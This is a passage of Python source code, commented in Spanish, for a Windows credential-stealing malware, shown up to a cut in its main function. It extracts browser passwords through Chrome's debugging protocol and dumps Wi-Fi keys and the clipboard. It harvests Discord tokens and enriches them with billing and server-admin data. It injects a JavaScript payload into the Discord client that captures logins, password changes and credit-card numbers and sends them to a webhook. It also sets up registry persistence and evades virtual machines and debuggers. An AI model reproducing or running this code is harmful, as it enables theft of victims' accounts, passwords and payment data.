# -------------------- export por CDP (respaldo) -------------------
GUION_EXPORT = r"""
(function(){
  const pila = [document.documentElement];
  const hallados = [];
  while (pila.length) {
    const n = pila.pop();
    if (!n) continue;
    if (n.shadowRoot) pila.push(n.shadowRoot);
    const hijos = n.children || [];
    for (let i = 0; i < hijos.length; i++) pila.push(hijos[i]);
    const etiqueta = (n.tagName || '').toUpperCase();
    if (etiqueta === 'BUTTON' || etiqueta === 'CR-BUTTON') {
      const t = (n.textContent || '').trim().toLowerCase();
      if (/download|export|descargar/.test(t)) hallados.push(n);
    }
  }
  if (hallados.length) { hallados[0].click(); return hallados[0].textContent.trim(); }
  return null;
})()
"""

GUION_PRIVATE = r"""
(function(){
  const api = (typeof chrome !== 'undefined' && chrome.passwordsPrivate)
              ? chrome.passwordsPrivate : null;
  if (!api) return 'SIN_API';
  const pedir = () => {
    try {
      const r = api.getPasswordList();
      if (r && typeof r.then === 'function') return r;
    } catch (e) {}
    return new Promise(res => {
      try { api.getPasswordList(res); } catch (e) { res(null); }
    });
  };
  return pedir().then(lista => {
    if (!lista) return 'VACIO';
    return JSON.stringify(lista.map(p => ({
      u: p.username || '',
      p: p.password || '',
      s: (p.urls && p.urls.length) ? (p.urls[0].url || '') : (p.linkUrl || '')
    })));
  }).catch(() => 'ERROR');
})()
"""

def _abrir_tab(enviar, url):
    tid = enviar("Target.createTarget", {"url": url}).get("targetId")
    if not tid:
        return None
    sid = enviar("Target.attachToTarget",
                 {"targetId": tid, "flatten": True}).get("sessionId")
    if sid:
        enviar("Page.enable", {}, sid)
    return sid

def _por_private(enviar):
    """Lee chrome.passwordsPrivate. Devuelve (lineas, con_clave)."""
    for url in ("chrome://password-manager/settings",
                "chrome://password-manager/passwords"):
        sid = _abrir_tab(enviar, url)
        if not sid:
            continue
        time.sleep(5)
        for _ in range(5):
            try:
                r = enviar("Runtime.evaluate",
                           {"expression": GUION_PRIVATE,
                            "awaitPromise": True, "returnByValue": True}, sid)
            except Exception:
                time.sleep(2)
                continue
            valor = r.get("result", {}).get("value")
            if isinstance(valor, str) and valor.startswith("["):
                try:
                    lista = json.loads(valor)
                except Exception:
                    lista = []
                lineas = [f"{e.get('s','')} | {e.get('u','')} | {e.get('p','')}"
                          for e in lista if e.get("u") or e.get("p")]
                if lineas:
                    return lineas, any(e.get("p") for e in lista)
            time.sleep(2)
    return [], False

def _por_csv(enviar, descargas):
    pulsado = False
    for url in ("chrome://password-manager/settings",
                "chrome://password-manager/passwords"):
        sid = _abrir_tab(enviar, url)
        if not sid:
            continue
        time.sleep(6)
        for _ in range(8):
            r = enviar("Runtime.evaluate",
                       {"expression": GUION_EXPORT, "returnByValue": True}, sid)
            if r.get("result", {}).get("value"):
                pulsado = True
                break
            time.sleep(1.5)
        if pulsado:
            break
    if not pulsado:
        return []
    csv_path = None
    for _ in range(40):
        hallados = sorted(descargas.glob("*.csv"),
                          key=lambda p: p.stat().st_mtime, reverse=True)
        if hallados:
            csv_path = hallados[0]
            break
        time.sleep(0.5)
    if not csv_path:
        return []
    lineas = []
    for fila in _csv.reader(io.StringIO(
            csv_path.read_text(encoding="utf-8-sig", errors="ignore"))):
        if len(fila) < 4 or fila[1].strip() == "url":
            continue
        lineas.append(f"{fila[1]} | {fila[2]} | {fila[3]}")
    return lineas

def _exportar_perfil(nombre, exe, local_state, db):
    temp = Path(TEMP) / f"ud_{uuid.uuid4().hex}"
    descargas = temp / "dl"
    proc = None
    ws = None
    try:
        (temp / "Default").mkdir(parents=True, exist_ok=True)
        descargas.mkdir(parents=True, exist_ok=True)
        if local_state and local_state.exists():
            shutil.copy2(local_state, temp / "Local State")
        shutil.copy2(db, temp / "Default" / "Login Data")
        for suf in ("-wal", "-shm"):
            extra = Path(str(db) + suf)
            if extra.exists():
                shutil.copy2(extra, temp / "Default" / f"Login Data{suf}")
    except Exception as e:
        log(f"  export {nombre}: copia fallida ({e})")
        return []

    puerto = _puerto_libre()
    try:
        proc = subprocess.Popen(
            [str(exe), f"--user-data-dir={temp}", f"--remote-debugging-port={puerto}",
             "--remote-allow-origins=*",
             "--profile-directory=Default",
             "--no-first-run", "--no-default-browser-check",
             "--disable-extensions", "--disable-sync",
             "--disable-background-networking", "--window-size=900,700",
             "about:blank"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            creationflags=NO_WIN)

        ws_url = None
        for _ in range(40):
            ws_url = _get_json(
                f"http://127.0.0.1:{puerto}/json/version").get("webSocketDebuggerUrl")
            if ws_url:
                break
            time.sleep(0.5)
        if not ws_url:
            log(f"  export {nombre}: sin puerto de depuracion")
            return []

        ws = WS(ws_url)
        contador = [0]

        def enviar(metodo, params=None, sesion=None):
            contador[0] += 1
            msg = {"id": contador[0], "method": metodo, "params": params or {}}
            if sesion:
                msg["sessionId"] = sesion
            ws.enviar(json.dumps(msg))
            while True:
                datos = json.loads(ws.recibir())
                if datos.get("id") == contador[0]:
                    return datos.get("result", {})

        enviar("Browser.setDownloadBehavior",
               {"behavior": "allow", "downloadPath": str(descargas)})

        lineas, con_clave = _por_private(enviar)
        if not con_clave:
            csv = _por_csv(enviar, descargas)
            if csv:
                lineas = csv
            elif not lineas:
                log(f"  export {nombre}: sin resultado (¿PIN de verificacion?)")
        return lineas
    except Exception as e:
        log(f"  export {nombre}: {e}")
        return []
    finally:
        try:
            if ws:
                ws.cerrar()
        except Exception:
            pass
        if proc:
            subprocess.run(["taskkill", "/f", "/t", "/pid", str(proc.pid)],
                           capture_output=True, creationflags=NO_WIN)
        shutil.rmtree(temp, ignore_errors=True)

def exportar_passwords(nombre, base, destino):
    exe = _exe_navegador(nombre, base)
    if not exe:
        log(f"  export {nombre}: no encontre el ejecutable")
        return 0
    ls = base / "Local State"

    total = 0
    for perfil in perfiles_chromium(base):
        db = archivo(perfil, "Login Data")
        if not db:
            continue
        etiqueta = perfil.name if perfil != base else "Principal"
        lineas = _exportar_perfil(nombre, exe, ls, db)
        if not lineas:
            continue
        guardar(Path(destino) / nombre / f"Export_{etiqueta}" / "passwords.txt",
                "\n".join([f"### {nombre} / {etiqueta} / export\n",
                           "url | usuario | contrasena\n"] + lineas))
        log(f"  export {nombre} [{etiqueta}]: {len(lineas)} contrasenas")
        total += len(lineas)
    return total

# ---------------------------- sistema -----------------------------
def info_sistema(destino):
    try:
        ip = requests.get("https://api.ipify.org", timeout=10).text if requests else "?"
    except Exception:
        ip = "?"
    mac = ":".join(re.findall("..", "%012x" % uuid.getnode()))
    hwid = "?"
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                            r"SOFTWARE\Microsoft\Cryptography") as k:
            hwid = winreg.QueryValueEx(k, "MachineGuid")[0]
    except Exception:
        pass
    ram = ps("(Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory")
    try:
        ram = f"{int(ram) / 1024**3:.1f} GB"
    except Exception:
        ram = "?"
    try:
        pantalla = (f"{ctypes.windll.user32.GetSystemMetrics(0)}x"
                    f"{ctypes.windll.user32.GetSystemMetrics(1)}")
    except Exception:
        pantalla = "?"

    datos = {
        "equipo": socket.gethostname(),
        "usuario": os.environ.get("USERNAME", "?"),
        "ip": ip, "mac": mac, "hwid": hwid,
        "so": f"{__import__('platform').system()} {__import__('platform').release()}",
        "cpu": os.environ.get("PROCESSOR_IDENTIFIER", "?"),
        "gpu": ps("(Get-CimInstance Win32_VideoController).Name") or "?",
        "ram": ram, "pantalla": pantalla,
        "fecha": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    guardar(Path(destino) / "sistema.txt",
            "\n".join(f"{k:>10}: {v}" for k, v in datos.items()))
    guardar(Path(destino) / "info.json", json.dumps(datos, indent=2, ensure_ascii=False))
    for nombre, cmd in (
        ("procesos", "Get-Process | Select-Object -Expand Name"),
        ("antivirus", "Get-CimInstance -Namespace root/SecurityCenter2 "
                      "-ClassName AntiVirusProduct | Select-Object displayName | Format-List"),
        ("apps", "Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\"
                 "CurrentVersion\\Uninstall\\* | Select-Object DisplayName | Format-Table -AutoSize"),
        ("clipboard", "Get-Clipboard"),
    ):
        try:
            guardar(Path(destino) / f"{nombre}.txt", ps(cmd))
        except Exception:
            pass
    for etiqueta, ruta in (("escritorio", Path(PERFIL) / "Desktop"),
                           ("documentos", Path(PERFIL) / "Documents")):
        try:
            if ruta.exists():
                guardar(Path(destino) / f"{etiqueta}.txt",
                        "\n".join(p.name for p in ruta.iterdir() if p.is_file())[:20000])
        except Exception:
            pass
    return datos

def robar_wifi(destino):
    if not ROBAR_WIFI:
        return 0
    try:
        salida = subprocess.run(["netsh", "wlan", "show", "profiles"],
                                capture_output=True, text=True, timeout=20,
                                creationflags=NO_WIN).stdout
        nombres = re.findall(
            r"(?:Perfil de todos los usuarios|All User Profile)\s*:\s*(.+)", salida)
        if not nombres:
            return 0
        lineas = ["### WiFi\n", "ssid | clave\n"]
        for n in nombres:
            n = n.strip()
            det = subprocess.run(
                ["netsh", "wlan", "show", "profile", f"name={n}", "key=clear"],
                capture_output=True, text=True, timeout=20,
                creationflags=NO_WIN).stdout
            m = re.search(r"(?:Contenido de la clave|Key Content)\s*:\s*(.+)", det)
            lineas.append(f"{n} | {m.group(1).strip() if m else '(abierta)'}")
        guardar(Path(destino) / "wifi.txt", "\n".join(lineas))
        CONTADOR["wifi"] = len(nombres)
        return len(nombres)
    except Exception:
        return 0

# ----------------------------- tokens -----------------------------
PATRON_CIFRADO = re.compile(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,})")
PATRON_JWT     = re.compile(r"(?<![\w-])([\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110})(?![\w-])")
PATRON_MFA     = re.compile(r"mfa\.[\w-]{80,90}")

def rutas_leveldb():
    salida = []
    for nombre, base in RUTAS_CHROMIUM.items():
        if not base.exists():
            continue
        ls = base / "Local State"
        candidatos = [base]
        try:
            candidatos += [d for d in base.iterdir() if d.is_dir()]
        except Exception:
            pass
        for p in candidatos:
            ldb = p / "Local Storage" / "leveldb"
            if ldb.exists():
                salida.append((nombre, ldb, ls if ls.exists() else None))
    return salida

def descifrar_token(blob, clave):
    if blob[:3] in (b"v10", b"v20") and clave and CRYPTO:
        try:
            nonce, cuerpo = blob[3:15], blob[15:]
            plano = AES.new(clave, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(
                cuerpo[:-16], cuerpo[-16:])
            return limpiar_prefijo_abe(plano) if blob[:3] == b"v20" \
                else plano.decode("utf-8", "ignore")
        except Exception:
            pass
    if blob[:3] in (b"v10", b"v20"):
        blob = blob[3:]
    try:
        return dpapi(blob).decode("utf-8", "ignore")
    except Exception:
        return ""

def api_discord(ruta, token):
    if requests is None:
        return None
    try:
        r = requests.get("https://discord.com/api/v9" + ruta,
                         headers={"Authorization": token, "User-Agent": UA},
                         timeout=15)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None

BADGES = [
    (1 << 0,  "<:staff:968704541946167357> Discord Staff"),
    (1 << 1,  "<:partner:968704542021652560> Partner"),
    (1 << 2,  "<:hypersquad_events:968704541774192693> HypeSquad Events"),
    (1 << 3,  "<:bug_hunter_1:968704541677723648> Bug Hunter"),
    (1 << 6,  "<:hypersquad_1:968704541501571133> Bravery"),
    (1 << 7,  "<:hypersquad_2:968704541883261018> Brilliance"),
    (1 << 8,  "<:hypersquad_3:968704541874860082> Balance"),
    (1 << 9,  "<:early_supporter:968704542126510090> Early Supporter"),
    (1 << 14, "<:bug_hunter_2:968704541774217246> Bug Hunter Gold"),
    (1 << 16, "<:verified_dev:968704541702905886> Verified Bot Dev"),
    (1 << 22, "Active Developer"),
]

def lista_badges(flags):
    if not flags:
        return "`None`"
    out = [t for bit, t in BADGES if flags & bit]
    return ", ".join(out) if out else "`None`"

def enriquecer(token):
    u = api_discord("/users/@me", token)
    if not u:
        return None

    campos = [{"name": "Token", "value": f"```{token}```", "inline": False},
              {"name": "Email", "value": f"`{u.get('email')}`", "inline": True},
              {"name": "Telefono", "value": f"`{u.get('phone') or 'None'}`", "inline": True}]

    nitro = {0: "None", 1: "Nitro Classic", 2: "Nitro Boost"}.get(
        u.get("premium_type"), "None")
    campos.append({"name": "Nitro", "value": f"`{nitro}`", "inline": True})

    bill = api_discord("/users/@me/billing/payment-sources", token)
    if bill:
        m = "".join("💳" if b.get("type") == 1 else "🅿️" for b in bill) or "`None`"
    else:
        m = "`None`"
    campos.append({"name": "Billing", "value": m, "inline": True})
    campos.append({"name": "Badges", "value": lista_badges(u.get("public_flags")), "inline": False})

    amigos = api_discord("/users/@me/relationships", token) or []
    hq = []
    for f in amigos:
        us = f.get("user") or {}
        if us.get("public_flags", 0) & 0x20007:
            hq.append(f"{lista_badges(us.get('public_flags'))} - "
                      f"`{us.get('username')}#{us.get('discriminator')} ({us.get('id')})`")
    if hq:
        campos.append({"name": "HQ Friends",
                       "value": "\n".join(hq[:12])[:1024], "inline": False})

    guilds = api_discord("/users/@me/guilds?with_counts=true", token) or []
    lineas = []
    for g in guilds:
        try:
            admin = int(g.get("permissions", 0)) & 0x8
        except Exception:
            admin = False
        if not admin or (g.get("approximate_member_count") or 0) < 50:
            continue
        inv = api_discord(f"/guilds/{g['id']}/invites", token) or []
        enlace = f"https://discord.gg/{inv[0]['code']}" if inv else "sin invite"
        tot = g.get("approximate_member_count") or 0
        on = g.get("approximate_presence_count") or 0
        lineas.append(f"**{g.get('name')}** `{g['id']}` owner:{'✅' if g.get('owner') else '❌'} "
                      f"| {tot}👥 {on}🟢 {tot - on}🔴\n{enlace}")
    if lineas:
        campos.append({"name": "HQ Guilds", "value": "\n".join(lineas[:8])[:1024], "inline": False})

    return {
        "id": u.get("id"),
        "nombre": f"{u.get('username')}#{u.get('discriminator')}",
        "avatar": (f"https://cdn.discordapp.com/avatars/{u.get('id')}/{u.get('avatar')}.webp"
                   if u.get("avatar") else ICONO),
        "campos": campos,
    }

def robar_tokens():
    if not ROBAR_DISCORD:
        return []
    encontrados = set()

    for nombre, ldb, ls in rutas_leveldb():
        clave = clave_chromium(ls) if ls else None
        for f in list(ldb.glob("*.ldb")) + list(ldb.glob("*.log")):
            try:
                texto = f.read_bytes().decode("utf-8", "ignore")
            except Exception:
                continue
            for m in PATRON_CIFRADO.finditer(texto):
                try:
                    encontrados.add(descifrar_token(base64.b64decode(m.group(1)), clave))
                except Exception:
                    pass
            for m in PATRON_JWT.finditer(texto):
                encontrados.add(m.group(1))
            for m in PATRON_MFA.finditer(texto):
                encontrados.add(m.group(0))

    for nombre, base in RUTAS_GECKO.items():
        if not base.exists():
            continue
        for f in list(base.rglob("*.sqlite")) + list(base.rglob("*.sqlite-wal")):
            if "storage" not in str(f) and f.name != "webappsstore.sqlite":
                continue
            try:
                texto = f.read_bytes().decode("utf-8", "ignore")
            except Exception:
                continue
            for m in PATRON_JWT.finditer(texto):
                encontrados.add(m.group(1))

    tokens = {t.strip().strip('"') for t in encontrados if t and len(t) > 20}
    tokens = {t for t in tokens if t.count(".") >= 2 or t.startswith("mfa.")}

    cuentas, ids = [], set()
    for t in tokens:
        if VALIDAR_TOKENS:
            c = enriquecer(t)
            if not c or c["id"] in ids:
                continue
            ids.add(c["id"])
            cuentas.append(c)
        else:
            cuentas.append({"id": t[:12], "nombre": t[:20], "avatar": ICONO,
                            "campos": [{"name": "Token", "value": f"```{t}```"}]})
    return cuentas

# ---------------------------- inyeccion ---------------------------
JS_PAYLOAD = r"""
const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const crypto = require('crypto');
const { BrowserWindow, session } = require('electron');

const config = {
    webhook: '%WEBHOOK%',
    webhook_protector_key: '%WEBHOOK_KEY%',
    auto_buy_nitro: %AUTO_NITRO%,
    ping_on_run: %PING%,
    ping_val: '@here',
    embed_name: '%NOMBRE%',
    embed_icon: '%ICONO%',
    embed_color: 0x000000,
    api: 'https://discord.com/api/v9/users/@me'
};

function totp(key) {
    const b32 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
    key = key.replace(/=+$/, '').toUpperCase();
    let bits = '';
    for (const ch of key) bits += b32.indexOf(ch).toString(2).padStart(5, '0');
    let hex = '';
    for (let i = 0; i + 8 <= bits.length; i += 8)
        hex += parseInt(bits.substr(i, 8), 2).toString(16).padStart(2, '0');
    const counter = Buffer.alloc(8);
    counter.writeUInt32BE(Math.floor(Date.now() / 1000 / 30), 4);
    const h = crypto.createHmac('sha1', Buffer.from(hex, 'hex')).update(counter).digest();
    const o = h[h.length - 1] & 0xf;
    const code = ((h[o] & 0x7f) << 24 | h[o+1] << 16 | h[o+2] << 8 | h[o+3]) % 1e6;
    return code.toString().padStart(6, '0');
}

function hooker(payload) {
    const url = new URL(config.webhook);
    const headers = { 'Content-Type': 'application/json' };
    if (config.webhook_protector_key) headers['Authorization'] = totp(config.webhook_protector_key);
    const req = https.request({
        protocol: url.protocol, hostname: url.hostname,
        path: url.pathname + url.search, method: 'POST', headers
    }, () => {});
    req.on('error', console.log);
    req.write(JSON.stringify(payload));
    req.end();
}

function execScript(script) {
    const win = BrowserWindow.getAllWindows()[0];
    if (!win) return;
    return win.webContents.executeJavaScript(script, true);
}

function getToken() {
    return execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
}

async function getInfo(token) {
    const raw = await execScript(`(function(){
        var x = new XMLHttpRequest();
        x.open('GET', ${JSON.stringify(config.api)}, false);
        x.setRequestHeader('Authorization', ${JSON.stringify(token)});
        x.send(null);
        return x.responseText;
    })()`);
    try { return JSON.parse(raw); } catch (e) { return {}; }
}

async function getBilling(token) {
    const raw = await execScript(`(function(){
        var x = new XMLHttpRequest();
        x.open('GET', ${JSON.stringify(config.api + '/billing/payment-sources')}, false);
        x.setRequestHeader('Authorization', ${JSON.stringify(token)});
        x.send(null);
        return x.responseText;
    })()`);
    try {
        const j = JSON.parse(raw);
        if (!Array.isArray(j)) return '❌';
        let s = '';
        j.forEach(b => { if (b.type === 1) s += '💳 '; else if (b.type === 2) s += '<:paypal:951139189389410365> '; });
        return s || '❌';
    } catch (e) { return '❌'; }
}

function getBadges(flags) {
    const map = [[1,'Discord Staff'],[2,'Partner'],[4,'HypeSquad Events'],[8,'Bug Hunter'],
                 [64,'Bravery'],[128,'Brilliance'],[256,'Balance'],[512,'Early Supporter'],
                 [16384,'Bug Hunter Gold'],[131072,'Verified Bot Dev'],[4194304,'Active Dev']];
    const out = map.filter(m => flags & m[0]).map(m => m[1]);
    return out.length ? out.join(', ') : 'None';
}

async function baseEmbed(token, extra) {
    const i = await getInfo(token);
    return {
        username: config.embed_name,
        avatar_url: config.embed_icon,
        embeds: [{
            color: config.embed_color,
            author: {
                name: (i.username || '?') + '#' + (i.discriminator || '0') + ' | ' + (i.id || '?'),
                icon_url: i.avatar ? 'https://cdn.discordapp.com/avatars/' + i.id + '/' + i.avatar + '.webp' : config.embed_icon
            },
            fields: extra.concat([
                { name: 'Discord Info', value: '**Nitro:** ' + (i.premium_type || 0) +
                  '\n**Badges:** ' + getBadges(i.flags || 0) +
                  '\n**Billing:** ' + await getBilling(token), inline: false },
                { name: 'Token', value: '`' + token + '`', inline: false }
            ]),
            footer: { text: 'Empyrean' }
        }]
    };
}

async function login(email, password, token) {
    hooker(await baseEmbed(token, [
        { name: 'Account Info', value: '**Email:** `' + email + '`\n**Password:** `' + password + '`', inline: false }
    ]));
}
async function passwordChanged(oldPw, newPw, token) {
    hooker(await baseEmbed(token, [
        { name: 'Password Changed', value: '**Old:** `' + oldPw + '`\n**New:** `' + newPw + '`', inline: false }
    ]));
}
async function emailChanged(oldE, newE, token) {
    hooker(await baseEmbed(token, [
        { name: 'Email Changed', value: '**Old:** `' + oldE + '`\n**New:** `' + newE + '`', inline: false }
    ]));
}
async function ccAdded(num, name, month, year, token) {
    hooker(await baseEmbed(token, [
        { name: 'Credit Card Added', value: '**Number:** `' + num + '`\n**Name:** `' + name +
          '`\n**Exp:** `' + month + '/' + year + '`', inline: false }
    ]));
}
async function paypalAdded(token) {
    hooker(await baseEmbed(token, [{ name: 'PayPal Added', value: '💳 PayPal vinculado', inline: false }]));
}
async function nitroBought(token) {
    hooker(await baseEmbed(token, [{ name: 'Nitro Bought', value: '🎉 comprado', inline: false }]));
}

const discordPath = (function () {
    const dir = args[0].split(path.sep).slice(0, -1).join(path.sep);
    const res = process.platform === 'win32' ? path.join(dir, 'resources')
              : path.join(dir, '..', 'Resources');
    return { resourcePath: res, app: dir };
})();

function coreAsarPath() {
    const mods = path.join(discordPath.app, 'modules');
    if (!fs.existsSync(mods)) return null;
    for (const d of fs.readdirSync(mods)) {
        if (!d.toLowerCase().startsWith('discord_desktop_core')) continue;
        const p = path.join(mods, d, 'discord_desktop_core', 'core.asar');
        if (fs.existsSync(p)) return p;
    }
    return null;
}

session.defaultSession.webRequest.onBeforeRequest(
    { urls: ['https://discord.com/api/v*/users/@me'] }, (d, cb) => {
        if (d.url.startsWith('https://discord.com/api/v9/users/@me')) return cb({ cancel: true });
        cb({});
    });

session.defaultSession.webRequest.onHeadersReceived((d, cb) => {
    if (d.url.startsWith(config.webhook)) {
        cb({ responseHeaders: Object.assign({
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*'
        }, d.responseHeaders) });
    } else {
        if (d.responseHeaders) {
            delete d.responseHeaders['content-security-policy'];
            delete d.responseHeaders['content-security-policy-report-only'];
        }
        cb({ responseHeaders: Object.assign({}, d.responseHeaders,
            { 'Access-Control-Allow-Headers': '*' }) });
    }
});

session.defaultSession.webRequest.onCompleted(
    { urls: ['https://discord.com/api/v*/auth/login',
             'https://discord.com/api/v*/users/@me',
             'https://api.stripe.com/v*/tokens',
             'https://api.braintreegateway.com/merchants/*/client_api/v*/payment_methods/paypal_accounts',
             'https://discord.com/api/v9/store/skus/*/purchase'] },
    async (d) => {
        try {
            if (!d.uploadData || !d.uploadData[0] || !d.uploadData[0].bytes) return;
            const raw = Buffer.from(d.uploadData[0].bytes).toString();
            const body = JSON.parse(raw);
            const token = await getToken();
            if (d.url.endsWith('/auth/login')) {
                login(body.login, body.password, token);
            } else if (d.url.endsWith('users/@me') && d.method === 'PATCH') {
                if (body.email) emailChanged(body.email, body.new_email || '', token);
                if (body.new_password) passwordChanged(body.password, body.new_password, token);
            } else if (d.url.includes('api.stripe.com') && d.method === 'POST') {
                const q = new URLSearchParams(raw);
                ccAdded(q.get('card[number]'), q.get('card[name]'),
                        q.get('card[exp_month]'), q.get('card[exp_year]'), token);
            } else if (d.url.includes('braintreegateway') && d.method === 'POST') {
                paypalAdded(token);
            } else if (d.url.includes('/purchase') && config.auto_buy_nitro) {
                setTimeout(() => nitroBought(token), 5000);
            }
        } catch (e) { console.log(e); }
    });

function updateCheck() {
    const { resourcePath, app } = discordPath;
    if (!resourcePath || !app) return;

    if (fs.existsSync(path.join(resourcePath, 'app.asar'))) return;

    const asar = coreAsarPath();
    if (!asar) return;
    const appPath = path.join(resourcePath, 'app');
    const indexJs = path.join(appPath, 'index.js');
    const pkg = path.join(appPath, 'package.json');
    const bd = path.join(process.env.APPDATA, 'betterdiscord', 'data', 'betterdiscord.asar');
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
    if (fs.existsSync(pkg)) fs.unlinkSync(pkg);
    fs.writeFileSync(pkg, JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));
    fs.writeFileSync(indexJs,
        'module.exports = require(' + JSON.stringify(asar) + ');\n' +
        fs.readFileSync(__filename, 'utf8'));
    if (fs.existsSync(bd)) require(bd);
}
updateCheck();
"""

def inyectar(webhook):
    if not INYECTAR:
        return False
    base = Path(LOCAL) / "Discord"
    if not base.exists():
        return False

    codigo = JS_PAYLOAD.replace("%WEBHOOK%", webhook or "") \
                       .replace("%WEBHOOK_KEY%", WEBHOOK_KEY or "") \
                       .replace("%AUTO_NITRO%", "true" if AUTO_NITRO else "false") \
                       .replace("%PING%", "true" if PING_ON_RUN else "false") \
                       .replace("%NOMBRE%", NOMBRE).replace("%ICONO%", ICONO)

    objetivos = []
    for d in base.iterdir():
        if not d.name.startswith("app-"):
            continue

        resources = d / "resources"
        if (resources / "app.asar").exists():
            shutil.rmtree(resources / "app", ignore_errors=True)

        mods = d / "modules"
        if not mods.exists():
            continue
        for c in mods.iterdir():
            if not c.name.lower().startswith("discord_desktop_core"):
                continue
            core = c / "discord_desktop_core"
            if (core / "core.asar").exists():
                objetivos.append((d, core))

    if not objetivos:
        log("inyeccion: no encontre discord_desktop_core")
        return False

    subprocess.run(["taskkill", "/f", "/im", "Discord.exe"],
                   capture_output=True, creationflags=NO_WIN)
    time.sleep(1.5)

    hecho = False
    for d, core in objetivos:
        contenido = "module.exports = require('./core.asar');\n" + codigo
        try:
            (core / "index.js").write_text(contenido, encoding="utf-8")
            hecho = True
            log(f"inyectado -> {core}")
        except Exception as e:
            log(f"inyeccion: {e}")

    if hecho:
        try:
            subprocess.Popen([str(objetivos[0][0] / "Discord.exe")])
        except Exception:
            pass
    return hecho

# --------------------------- persistencia -------------------------
def persistir():
    if not PERSISTENCIA or not getattr(sys, "frozen", False):
        return
    try:
        origen = Path(sys.executable)
        destino = Path(ROAM) / NOMBRE / origen.name
        destino.parent.mkdir(parents=True, exist_ok=True)
        if origen.resolve() != destino.resolve():
            shutil.copy2(origen, destino)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, NOMBRE, 0, winreg.REG_SZ, str(destino))
        inicio = Path(ROAM) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
        if inicio.exists():
            try:
                shutil.copy2(destino, inicio / destino.name)
            except Exception:
                pass
    except Exception:
        pass

# ----------------------------- anti-VM ----------------------------
PROCESOS_VM = ("vboxservice", "vboxtray", "vmtoolsd", "vmwaretray", "vmwareuser",
               "vgauthservice", "qemu-ga", "xenservice", "prl_cc", "prl_tools",
               "joeboxserver", "sandboxie", "wireshark", "fiddler", "processhacker",
               "x64dbg", "x32dbg", "ollydbg", "ida64", "pestudio")
OUIS_VM = ("08:00:27", "00:0c:29", "00:50:56", "00:15:5d", "52:54:00",
           "00:16:3e", "00:1c:42")

def procesos_activos():
    try:
        r = subprocess.run(["tasklist", "/fo", "csv", "/nh"],
                           capture_output=True, text=True, timeout=15,
                           creationflags=NO_WIN)
        return r.stdout.lower()
    except Exception:
        return ""

def es_vm():
    if not ANTI_VM:
        return False
    salida = procesos_activos()
    if any(x in salida for x in PROCESOS_VM):
        return True
    mac = ":".join(re.findall("..", "%012x" % uuid.getnode())).lower()
    return any(mac.startswith(o) for o in OUIS_VM)

# ----------------------------- upload -----------------------------
LIMITE = 8_000_000

def crear_zips(carpeta):
    archivos = sorted(p for p in Path(carpeta).rglob("*") if p.is_file())
    if not archivos:
        return []
    partes, actual, tam = [], None, 0
    for p in archivos:
        s = p.stat().st_size
        if actual is None or (tam + s > LIMITE and tam > 0):
            if actual:
                actual.close()
            nombre = f"{NOMBRE}_parte{len(partes) + 1}.zip"
            actual = zipfile.ZipFile(Path(TEMP) / nombre, "w", zipfile.ZIP_DEFLATED)
            partes.append(Path(TEMP) / nombre)
            tam = 0
        try:
            actual.write(p, p.relative_to(carpeta))
            tam += s
        except Exception:
            pass
    if actual:
        actual.close()
    return partes

def cabeceras():
    h = {"User-Agent": UA}
    if WEBHOOK_KEY:
        try:
            relleno = "=" * ((8 - len(WEBHOOK_KEY) % 8) % 8)
            clave = base64.b32decode(WEBHOOK_KEY.upper() + relleno)
            contador = struct.pack(">Q", int(time.time()) // 30)
            hsh = hmac.new(clave, contador, hashlib.sha1).digest()
            o = hsh[-1] & 0xF
            codigo = struct.unpack(">I", hsh[o:o + 4])[0] & 0x7FFFFFFF
            h["Authorization"] = f"{codigo % 1000000:06d}"
        except Exception:
            pass
    return h

def enviar_embeds(webhook, embeds):
    for i in range(0, len(embeds), 10):
        lote = embeds[i:i + 10]
        payload = {"username": NOMBRE, "avatar_url": ICONO, "embeds": lote}
        if PING_ON_RUN and i == 0:
            payload["content"] = "@here"
        for _ in range(3):
            try:
                r = requests.post(webhook, json=payload, headers=cabeceras(), timeout=30)
                if r.status_code in (200, 204):
                    break
            except Exception:
                pass
            time.sleep(2)
        time.sleep(0.6)

def subir(partes, embed):
    if requests is None or not WEBHOOK or "PEGA" in WEBHOOK:
        return
    for i, parte in enumerate(partes):
        payload = {"embeds": [embed]} if i == 0 else {"content": f"{i + 1}/{len(partes)}"}
        for _ in range(3):
            try:
                with open(parte, "rb") as f:
                    r = requests.post(WEBHOOK,
                                      data={"payload_json": json.dumps(payload)},
                                      files={"file": (parte.name, f, "application/zip")},
                                      headers=cabeceras(), timeout=180)
                if r.status_code in (200, 204):
                    break
            except Exception:
                pass
            time.sleep(2)
        time.sleep(0.8)

# ------------------------------ main ------------------------------
def main():
    if es_vm() and SELF_DESTRUCT:
        log("VM detectada, saliendo")
        return

    destino = Path(TEMP) / f"{NOMBRE}_{uuid.uuid4().hex[:6]}"
    destino.mkdir(parents=True, exist_ok=True)
    navegadores = destino / "navegadores"
    navegadores.mkdir(parents=True, exist_ok=True)

    persistir()
    inyectar(WEBHOOK)

    datos = info_sistema(destino)
    resumen = []
    for nombre, base in RUTAS_CHROMIUM.items():
        try:
            n = extraer_chromium(nombre, base, navegadores)
            resumen.append(f"{nombre}: {n} elementos")
        except Exception as e:
            resumen.append(f"{nombre}: error {e}")
            log(f"  {nombre}: {e}")
    for nombre, base in RUTAS_GECKO.items():
        try:
